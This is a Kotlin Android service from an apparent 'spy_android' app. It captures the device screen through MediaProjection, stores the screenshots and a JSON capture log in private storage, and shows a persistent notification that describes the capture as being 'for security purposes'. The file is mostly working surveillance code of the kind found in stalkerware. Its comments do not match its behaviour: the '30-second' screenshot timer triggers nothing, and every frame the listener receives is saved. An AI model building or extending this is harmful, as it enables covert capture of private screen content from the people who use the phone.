package com.example.spy_android.services

import android.app.*
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.Image
import android.media.ImageReader
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.IBinder
import android.os.Handler
import android.os.Looper
import android.util.DisplayMetrics
import android.util.Log
import android.view.WindowManager
import androidx.core.app.NotificationCompat
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.*

class ScreenRecordingService : Service() {

    companion object {
        private const val TAG = "ScreenRecordingService"
        private const val CHANNEL_ID = "SCREEN_RECORDING_CHANNEL"
        private const val NOTIFICATION_ID = 2001

        var instance: ScreenRecordingService? = null
        var isRecording = false
    }

    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var mediaRecorder: MediaRecorder? = null
    private var imageReader: ImageReader? = null

    private var screenWidth = 0
    private var screenHeight = 0
    private var screenDensity = 0

    private val handler = Handler(Looper.getMainLooper())
    private var screenshotRunnable: Runnable? = null

    override fun onCreate() {
        super.onCreate()
        instance = this

        initializeScreenMetrics()
        createNotificationChannel()

        Log.d(TAG, "화면 녹화 서비스 생성됨")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val resultCode = intent?.getIntExtra("resultCode", -1) ?: -1
        val data = intent?.getParcelableExtra<Intent>("data")

        if (resultCode != -1 && data != null) {
            startForegroundService()
            startScreenCapture(resultCode, data)
        }

        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onDestroy() {
        super.onDestroy()
        stopScreenCapture()
        instance = null
        Log.d(TAG, "화면 녹화 서비스 종료됨")
    }

    private fun initializeScreenMetrics() {
        val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val displayMetrics = DisplayMetrics()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            val display = windowManager.defaultDisplay
            display.getRealMetrics(displayMetrics)
        } else {
            @Suppress("DEPRECATION")
            windowManager.defaultDisplay.getMetrics(displayMetrics)
        }

        screenWidth = displayMetrics.widthPixels
        screenHeight = displayMetrics.heightPixels
        screenDensity = displayMetrics.densityDpi

        Log.d(TAG, "화면 해상도: ${screenWidth}x${screenHeight}, DPI: $screenDensity")
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Screen Recording Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Screen recording and screenshot capture service"
                setShowBadge(false)
            }

            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            manager.createNotificationChannel(channel)
        }
    }

    private fun startForegroundService() {
        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Screen Monitoring Active")
            .setContentText("Recording screen activity for security purposes...")
            .setSmallIcon(android.R.drawable.ic_media_play)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .setShowWhen(false)
            .build()

        startForeground(NOTIFICATION_ID, notification)
    }

    private fun startScreenCapture(resultCode: Int, data: Intent) {
        val mediaProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        mediaProjection = mediaProjectionManager.getMediaProjection(resultCode, data)

        if (mediaProjection != null) {
            setupImageReader()
            createVirtualDisplay()
            startPeriodicScreenshots()
            isRecording = true

            Log.d(TAG, "화면 캡처 시작됨")
        } else {
            Log.e(TAG, "MediaProjection 생성 실패")
        }
    }

    private fun setupImageReader() {
        imageReader = ImageReader.newInstance(screenWidth, screenHeight, PixelFormat.RGBA_8888, 2)

        imageReader?.setOnImageAvailableListener({ reader ->
            val image = reader.acquireLatestImage()
            if (image != null) {
                processScreenshot(image)
                image.close()
            }
        }, handler)
    }

    private fun createVirtualDisplay() {
        virtualDisplay = mediaProjection?.createVirtualDisplay(
            "ScreenCapture",
            screenWidth,
            screenHeight,
            screenDensity,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader?.surface,
            null,
            null
        )
    }

    private fun startPeriodicScreenshots() {
        screenshotRunnable = object : Runnable {
            override fun run() {
                if (isRecording) {
                    triggerScreenshot()
                    // 30초마다 스크린샷 촬영
                    handler.postDelayed(this, 30000)
                }
            }
        }

        handler.post(screenshotRunnable!!)
    }

    private fun triggerScreenshot() {
        try {
            // ImageReader가 자동으로 스크린샷을 캡처함
            Log.d(TAG, "스크린샷 트리거됨")
        } catch (e: Exception) {
            Log.e(TAG, "스크린샷 트리거 오류: ${e.message}")
        }
    }

    private fun processScreenshot(image: Image) {
        try {
            val planes = image.planes
            val buffer = planes[0].buffer
            val pixelStride = planes[0].pixelStride
            val rowStride = planes[0].rowStride
            val rowPadding = rowStride - pixelStride * screenWidth

            val bitmap = Bitmap.createBitmap(
                screenWidth + rowPadding / pixelStride,
                screenHeight,
                Bitmap.Config.ARGB_8888
            )

            bitmap.copyPixelsFromBuffer(buffer)

            // 실제 크기로 자르기
            val croppedBitmap = Bitmap.createBitmap(bitmap, 0, 0, screenWidth, screenHeight)

            saveScreenshot(croppedBitmap)

            bitmap.recycle()
            croppedBitmap.recycle()

        } catch (e: Exception) {
            Log.e(TAG, "스크린샷 처리 오류: ${e.message}")
        }
    }

    private fun saveScreenshot(bitmap: Bitmap) {
        try {
            val screenshotsDir = File(filesDir, "screenshots")
            if (!screenshotsDir.exists()) {
                screenshotsDir.mkdirs()
            }

            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
            val filename = "screenshot_$timestamp.png"
            val file = File(screenshotsDir, filename)

            FileOutputStream(file).use { out ->
                bitmap.compress(Bitmap.CompressFormat.PNG, 90, out)
            }

            // 스크린샷 정보 로그
            logScreenshotInfo(file.absolutePath, bitmap.width, bitmap.height)

            Log.d(TAG, "스크린샷 저장됨: ${file.absolutePath}")

        } catch (e: Exception) {
            Log.e(TAG, "스크린샷 저장 오류: ${e.message}")
        }
    }

    private fun logScreenshotInfo(filePath: String, width: Int, height: Int) {
        try {
            val screenshotData = mapOf(
                "event_type" to "screenshot_captured",
                "file_path" to filePath,
                "width" to width,
                "height" to height,
                "timestamp" to System.currentTimeMillis(),
                "formatted_time" to SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
            )

            val logDir = File(filesDir, "logs")
            if (!logDir.exists()) {
                logDir.mkdirs()
            }

            val logFile = File(logDir, "screenshot_log.json")
            val jsonData = android.text.TextUtils.join(",", screenshotData.map { "\"${it.key}\":\"${it.value}\"" })
            logFile.appendText("{$jsonData}\n")

        } catch (e: Exception) {
            Log.e(TAG, "스크린샷 로그 저장 실패: ${e.message}")
        }
    }

    private fun stopScreenCapture() {
        isRecording = false

        screenshotRunnable?.let { handler.removeCallbacks(it) }

        virtualDisplay?.release()
        virtualDisplay = null

        imageReader?.close()
        imageReader = null

        mediaProjection?.stop()
        mediaProjection = null

        Log.d(TAG, "화면 캡처 중지됨")
    }

    // 외부에서 호출할 수 있는 메서드들
    fun takeScreenshot(): Boolean {
        return if (isRecording) {
            triggerScreenshot()
            true
        } else {
            false
        }
    }

    fun getScreenshotCount(): Int {
        return try {
            val screenshotsDir = File(filesDir, "screenshots")
            if (screenshotsDir.exists()) {
                screenshotsDir.listFiles()?.size ?: 0
            } else {
                0
            }
        } catch (e: Exception) {
            0
        }
    }
}